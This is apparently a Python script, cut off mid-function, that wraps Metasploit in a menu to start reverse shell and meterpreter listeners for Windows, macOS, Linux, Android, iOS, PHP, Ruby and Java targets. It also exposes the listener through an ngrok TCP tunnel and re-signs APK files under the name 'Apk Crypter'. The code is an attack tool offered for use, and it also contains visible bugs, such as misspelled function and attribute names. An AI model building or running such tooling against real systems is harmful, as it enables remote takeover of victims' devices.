import os, sys, time
from requests import get
from time import sleep

class colors:
    whit = '\033[37m'
    end = '\033[0m' # end
    red = '\033[31m' # red
    green = '\033[1;32m' # green
    orange = '\033[33m' # orange
    blue = '\033[34m' # blue
    purple = '\033[35m' # purple
    white = "\x1b[97m" #end white
    redf = '\033[41m'#redf
    yellow = '\033[93m' #yellow


def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(2/800)

def slowprint2(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(2/100)


if os.geteuid() != 0:
    exit(colors.red + "You need to have root privileges to run this script.\nRun the script with 'sudo'")


#check dependencies existence
if os.system("which msfconsole >/dev/null 2>&1") == 0:
  slowprint2(colors.green + " [ ✔ ] Metasploit-Framework Found")
  time.sleep(1)
  pass
else:
  slowprint2(colors.green + "[+] Installing Metasploit")
  time.sleep(1)
  os.system("apt-get install metasploit-framework")

if os.system("which xterm >/dev/null 2>&1") == 0:
  slowprint2(colors.green + " [ ✔ ] Xterm Found")
  time.sleep(1)
  pass
else:
  slowprint2(colors.green + "[+] Installing Xterm")
  time.sleep(1)
  os.system("apt install xterm")

def install():
  start()
  slowprint2(colors.green + "[+] INSTALLATION MENU [+] \n")
  slowprint2("\033[37m[\033[31m1\033[37m]  Linux - Install/Update")
  slowprint2("\033[37m[\033[31m2\033[37m]  VPS   - Install  (EC2)")
  slowprint2("\033[37m[\033[31m00\033[37m]  Back\n")
  ins = str(input("\033[37m[\033[31m+\033[37m] Choice > "))
  if ins == "1":
    os.system('apt update; apt install metasploit-framework')
  elif ins == "2":
    os.system('wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run && wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run.sha1 && echo $(cat metasploit-latest-linux-x64-installer.run.sha1)'  'metasploit-latest-linux-x64-installer.run > metasploit-latest-linux-x64-installer.run.sha1 && shasum -c metasploit-latest-linux-x64-installer.run.sha1 && chmod +x ./metasploit-latest-linux-x64-installer.run && sudo ./metasploit-latest-linux-x64-installer.run')
  elif ins == "00":
    menu()  
  else:
    menu()

def ngrokins():
  if os.path.isfile('ngrok'):
    slowprint2(colors.green + "[+] NGROK FOUND")
    time.sleep(2)
    menu()
  else:
    try:
      slowprint2(colors.green + "[*] Architecture Type : ")
      os.system('dpkg --print-architecture')
      ngr = input("Enter Above Displayed Architecture Type : ")
      if ngr == "aarch64":
        os.system('wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip')
        os.system('unzip ngrok-stable-linux-arm64.zip')
        os.system('chmod 777 ngrok')
        slowprint2(colors.green + "[+] Done [+]")
        time.sleep(2)
        menu()
      elif ngr == "amd64":
        os.system('wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip')
        os.system('unzip ngrok-stable-linux-amd64.zip')
        os.system('chmod 777 ngrok')
        menu()    
      elif ngr == "arm":
        os.system('wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip')
        os.system('unzip ngrok-stable-linux-arm.zip')
        os.system('chmod 777 ngrok')
        menu()      
      elif ngr == "armhf":
        os.system('wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip')
        os.system('unzip ngrok-stable-linux-arm.zip')
        os.system('chmod 777 ngrok')
        menu()      
      else:
        slowprint2(colors.red + "Architecture Not Found ")
        time.sleep(2)
        menu()
    except:
      slopwprint2(colors.red + "System Error")
      time.sleep(2)
      menu()

def ngrokfire():
  slowprint2(colors.red + "[!] Don't Close Ngrok Session terminal until stoping Work With Ngrok Session ")
  time.sleep(2)
  os.system('xterm -fg green -bg black -e ./ngrok tcp 4444 > /dev/null 2>&1 &')
  menu()

  
def pfwrd():
  start()
  slowprint2(colors.green + "[+] PORT FORWARDING MENU [+] \n")
  slowprint2("\033[37m[\033[31m1\033[37m] Install Ngrok")
  slowprint2("\033[37m[\033[31m2\033[37m] Fire-Up Ngrok")
  slowprint2("\033[37m[\033[31m00\033[37m] Back\n")
  pfch = str(input("\033[37m[\033[31m+\033[37m] Ngrok > "))
  if pfch == "1":
    ngrokins()
  if pfch == "2":
    ngrokfire()
  if pfch == "00":
    menu()
  else:
    slowprint2(colors.red + "[!] Error")
    time.sleep(2)
    menu()
  

def start():
  os.system('clear')
  os.system('bash banner.sh')

def androencrypt():
  start()
  andropayload = str(input("\033[37m[\033[31m+\033[37m] Apk Name > "))
  os.system('keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000')
  os.system('jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore {0}.apk alias_name'.format(andropayload))
  time.sleep(2)
  menu()

def menu():
  start()
  slowprint2("\033[37m[\033[31m1\033[37m] Install/Update")
  slowprint2("\033[37m[\033[31m2\033[37m] Create Payload")
  slowprint2("\033[37m[\033[31m3\033[37m] Start Listner")
  slowprint2("\033[37m[\033[31m4\033[37m] Port Forwarding")
  slowprint2("\033[37m[\033[31m5\033[37m] Apk Crypter")
  slowprint2("\033[37m[\033[31m6\033[37m] Update")
  slowprint2("\033[37m[\033[31m7\033[37m] Exit\n")
  uchoice = str(input("\033[37m[\033[31m+\033[37m] \033[1;32mMSF > "))
  if uchoice == "1":
    install()
  elif uchoice == "2":
    crpay()
  elif uchoice == "3":
    pay()
  elif uchoice == "4":
    pfwrd()
  elif uchoice == "5":
    androencrypt()
  elif uchoice == "6":
    update()
  elif uchoice == "7":
    exit()
  else:
    menu()

def update():
  os.system('git pull')
  print("\n")
  slowprint2(colors.green + "Script Updated" + colors.red + "Restart The Script")
  time.sleep(2)
  print("\n")


def dbstart():
  slowprint2(colors.green + " [ ✔ ] SERVICE MSFDB STARTING")
  os.system('msfdb init')
  os.system("msfdb start")
  slowprint2(colors.green + " [ ✔ ] SERVICE MSFDB STARTED")
  time.sleep(2)
  slowprint2(colors.green + " [ ✔ ] SERVICE POSTGRSQL STARTING")
  os.system("service postgresql start")
  slowprint2(colors.green + " [ ✔ ] SERVICE POSTGRSQL STARTED")
  time.sleep(2)

def exit():
  slowprint2(colors.red + "[!] Stoping Script [!]")
  time.sleep(2)
  os.system("service postgresql stop")
  os.system("msfdb stop")
  os.system("apt clean")
  quit()


def pubip():
  print("\n")
  ip = get('https://api.ipify.org').text
  slowprint(colors.whit + "[IP] Your Public Ip is : "+ colors.purple + ip)
  print("\n")

def pay():
  start()
  slowprint2("\033[37m[\033[31m+\033[37m] Listner Menu \033[37m[\033[31m+\033[37m]")
  slowprint(colors.green + """

PAYLOADS AVAIBLE :

[1]  Windows
[2]  MAC OX
[3]  Linux
[4]  Android
[5]  PHP
[6]  Python
[7]  Ruby
[8]  Java
[9]  Apple_ios

[00] Back

""")
  pay = str(input("\033[37m[\033[31m+\033[37m] Payload > "))
  if pay == "1":
    liswin()
  elif pay == "2":
    lismac()
  elif pay == "3":
    lislinux()
  elif pay == "4":
    lisandro()
  elif pay == "5":
    lisphp()
  elif pay == "7":
    lisruby()
  else:
    menu()

def liswin():
  pubip()
  slowprint(colors.green + """
[1]  windows/shell/reverse_tcp
[2]  windows/meterpreter/reverse_http
[3]  windows/meterpreter/reverse_https
[4]  windows/meterpreter/reverse_tcp
[5]  windows/meterpreter_reverse_http
[6]  windows/meterpreter_reverse_https
[7]  windows/meterpreter_reverse_tcp

[00] Back

""")
  win = str(input("\033[37m[\033[31m+\033[37m] Win > "))
  if win == "1":
    pubip()
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    winpay = "windows/shell/reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,winpay))
    menu()
  elif win == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    winpay = "windows/meterpreter/reverse_http"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,winpay))
    menu()
  elif win == "3":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    winpay = "windows/meterpreter/reverse_https"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,winpay))
    menu()
  elif win == "4":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    winpay = "windows/meterpreter/reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,winpay))
    menu()
  elif win == "5":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    winpay = "windows/meterpreter_reverse_http"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,winpay))
    menu()
  elif win == "6":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    winpay = "windows/meterpreter_reverse_https"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,winpay))
    menu()
  elif win == "7":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    winpay = "windows/meterpreter_reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,winpay))
    menu()
  elif win == "00" : 
    menu()
  else:
    menu()

def lisandro():
    pubip()
    slowprint(colors.green + """
[1]  android/shell/reverse_http
[2]  android/shell/reverse_https
[3]  android/shell/reverse_tcp
[4]  android/meterpreter/reverse_http
[5]  android/meterpreter/reverse_https
[6]  android/meterpreter/reverse_tcp
[7]  android/meterpreter_reverse_http
[8]  android/meterpreter_reverse_https
[9]  android/meterpreter_reverse_tcp

[00] Back

""")
    andro = str(input("\033[37m[\033[31m+\033[37m] Android > "))
    if andro == "1":
      host = str(input("\033[37m[+] LHOST : "))
      port = str(input("\033[37m[+] LPORT : "))
      andro = "android/shell/reverse_http"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,andro))
      menu()
    elif andro == "2":
      host = str(input("\033[37m[+] LHOST : "))
      port = str(input("\033[37m[+] LPORT : "))
      andro = "android/shell/reverse_https"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,andro))
      menu()
    elif andro == "3":
      host = str(input("\033[37m[+] LHOST : "))
      port = str(input("\033[37m[+] LPORT : "))
      andro = "android/shell/reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,andro))
      menu()
    elif andro == "5":
      host = str(input("\033[37m[+] LHOST : "))
      port = str(input("\033[37m[+] LPORT : "))
      andro = "android/meterpreter/reverse_https"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,andro))
      menu()
    elif andro == "6":
      host = str(input("\033[37m[+] LHOST : "))
      port = str(input("\033[37m[+] LPORT : "))
      andro = "android/meterpreter/reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,andro))
      menu()
    elif andro == "7":
      host = str(input("\033[37m[+] LHOST : "))
      port = str(input("\033[37m[+] LPORT : "))
      andro = "android/meterpreter_reverse_http"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,andro))
      menu()
    elif andro == "8":
      host = str(input("\033[37m[+] LHOST : "))
      port = str(input("\033[37m[+] LPORT : "))
      andro = "android/meterpreter_reverse_https"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,andro))
      menu()
    elif andro == "9":
      host = str(input("\033[37m[+] LHOST : "))
      port = str(input("\033[37m[+] LPORT : "))
      andro = "android/meterpreter_reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,andro))
      menu()
    elif andro == "00":
      menu()
    else:
      menu()



def lismac():
  pubip()
  slowprint(colors.green + """"
[1]  osx/ppc/shell_reverse_tcp
[2]  osx/ppc/shell/reverse_tcp
[3]  osx/x64/meterpreter/reverse_tcp
[4]  osx/x64/meterpreter_reverse_http
[5]  osx/x64/meterpreter_reverse_https
[6]  osx/x64/meterpreter_reverse_tcp
[7]  osx/armle/execute/reverse_tcp
[8]  osx/armle/shell/reverse_tcp
[9]  osx/armle/shell_reverse_tcp

[00] Back

""")
  osx = str(input("\033[37m[\033[31m+\033[37m] OSX > "))
  if osx == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    osxpay = "osx/ppc/shell_reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,osxpay))
    menu()
  elif osx == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    osxpay = "osx/ppc/shell/reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,osxpay))
    menu()
  elif osx == "3":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    osxpay = "osx/x64/meterpreter/reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,osxpay))
    menu()
  elif osx == "4":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    osxpay = "osx/x64/meterpreter_reverse_http"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,osxpay))
    menu()
  elif osx == "5":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    osxpay = "osx/x64/meterpreter_reverse_https"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,osxpay))
    menu()
  elif osx == "6":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    osxpay = "osx/x64/meterpreter_reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,osxpay))
    menu()
  elif osx == "7":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    osxpay = "osx/armle/execute/reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,osxpay))
    menu()
  elif osx == "8":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    osxpay = "osx/armle/shell/reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,osxpay))
    menu()
  elif osx == "9":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    osxpay = "osx/armle/shell_reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,osxpay))
    menu()
  elif osx == "00":
    menu()
  else:
    menu()
  
def lislinux():
  pubip()
  slowprint(colors.green + """
[1]  linux/x86/shell/reverse_tcp
[2]  linux/x86/meterpreter_reverse_http
[3]  linux/x86/meterpreter_reverse_https
[4]  linux/x86/meterpreter_reverse_tcp
[5]  linux/x64/shell/reverse_tcp
[6]  linux/x64/meterpreter_reverse_http
[7]  linux/x64/meterpreter_reverse_https
[8]  linux/x64/meterpreter_reverse_tcp

[00] Back

""")
  linx = str(input("\033[37m[\033[31m+\033[37m] Linux > "))
  if linx == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    linuxpay = "linux/x86/shell/reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,linuxpay))
    menu()
  elif linx == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    linuxpay = "linux/x86/meterpreter_reverse_http"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,linuxpay))
    menu()
  elif linx == "3":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    linuxpay = "linux/x86/meterpreter_reverse_https"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,linuxpay))
    menu()
  elif linx == "4":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    linuxpay = "linux/x86/meterpreter_reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,linuxpay))
    menu()
  elif linx == "5":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    linuxpay = "linux/x64/shell/reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,linuxpay))
    menu()
  elif linx == "6":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    linuxpay = "linux/x64/meterpreter_reverse_http"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,linuxpay))
    menu()
  elif linx == "7":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    linuxpay = "linux/x64/meterpreter_reverse_https"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,linuxpay))
    menu()
  elif linx == "8":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    linuxpay = "linux/x64/meterpreter_reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,linuxpay))
    menu()
  elif linx == "00":
    menu()
  else:
    menu()


def lisphp():
  pubip()
  slowprint(colors.green + """
  
[1]  php/meterpreter/reverse_tcp

[00] Back

""")
  php = str(input("\033[37m[\033[31m+\033[37m] PHP > "))
  if php == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    phppay = "php/meterpreter/reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,phppay))
    menu()
  if php == "00":
    menu()
  else:
    menu()


def lispython():
  pubip()
  slowprint(colors.green + """
  
[1]  python/shell_reverse_tcp
[2]  python/meterpreter/reverse_tcp

[00] Back

""")
  python = str(input("\033[37m[\033[31m+\033[37m] Python > "))
  if python == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    pythonpay = "python/shell_reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pythonpay))
    menu()
  elif python == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    pythonpay = "python/meterpreter/reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pythonpay))
    menu()
  elif python == "00":
    menu()
  else:
    menu()

def lisruby():
  pubip()
  slowprint(colors.green + """
  
[1]  ruby/shell_reverse_tcp_ssl
[2]  ruby/shell_reverse_tcp
[3]  ruby/shell_bind_tcp_ipv6
[4]  ruby/shell_bind_tcp

[00] Back

""")
  ruby = str(input("\033[37m[\033[31m+\033[37m] Ruby > "))
  if ruby == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    rubypay = "ruby/shell_reverse_tcp_ssl"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,rubypay))
    menu()
  elif ruby == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    rubypay = "ruby/shell_reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,rubypay))
    menu()
  elif ruby == "3":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    rubypay = "ruby/shell_bind_tcp_ipv6"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,rubypay))
    menu()
  elif ruby == "4":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    rubypay = "ruby/shell_bind_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,rubypay))
    menu()
  if ruby == "00":
    menu()
  else:
    menu()
  
def lisjava():
  pubip()
  slowprint(colors.greem + """
[1]  java/meterpreter/reverse_http
[2]  java/meterpreter/reverse_https
[3]  java/meterpreter/reverse_tcp
[4]  java/shell/reverse_tcp
[5]  java/meterpreter/bind_tcp
[6]  java/shell/bind_tcp

[00] Back

""")
  java = str(input("\033[37m[\033[31m+\033[37m] Java > "))
  if java == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    javapay = "java/meterpreter/reverse_http"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,javapay))
    menu()
  elif java == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    javapay = "java/meterpreter/reverse_https"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,javapay))
    menu()
  elif java == "3":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    javapay = "java/meterpreter/reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,javapay))
    menu()
  elif java == "4":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    javapay = "java/shell_reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,javapay))
    menu()
  elif java == "5":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    javapay = "java/meterpreter/bind_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,javapay))
    menu()
  elif java == "6":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    javapay = "java/shell/bind_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,javapay))
    menu()
  elif java == "00":
    menu()
  else:
    menu()

def lisapple():
  pubip()
  slowprint(colors.green + """
[1]  apple_ios/aarch64/meterpreter_reverse_http
[2]  apple_ios/aarch64/meterpreter_reverse_https
[3]  apple_ios/aarch64/meterpreter_reverse_tcp
[4]  apple_ios/aarch64/shell_reverse_tcp

[00] Back

""")
  apple = str(input("\033[37m[\033[31m+\033[37m] Apple > "))
  if apple == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    applepay = "apple_ios/aarch64/meterpreter_reverse_http"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,applepay))
    menu()
  elif apple == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    applepay = "apple_ios/aarch64/meterpreter_reverse_https"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,applepay))
    menu()
  elif apple == "3":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    applepay = "apple_ios/aarch64/meterpreter_reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,applepay))
    menu()
  elif apple == "4":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    applepay = "apple_ios/aarch64/shell_reverse_tcp"
    os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,applepay))
    menu()
  elif apple == "00":
    menu()
  else:
    menu()


def crpay():
  start()
  slowprint2("\033[37m[\033[31m+\033[37m] Create Payload Menu \033[37m[\033[31m+\033[37m]")
  slowprint(colors.green + """
  
PAYLOADS AVAIBLE :
 
[1]  Windows
[2]  MAC OX
[3]  Linux
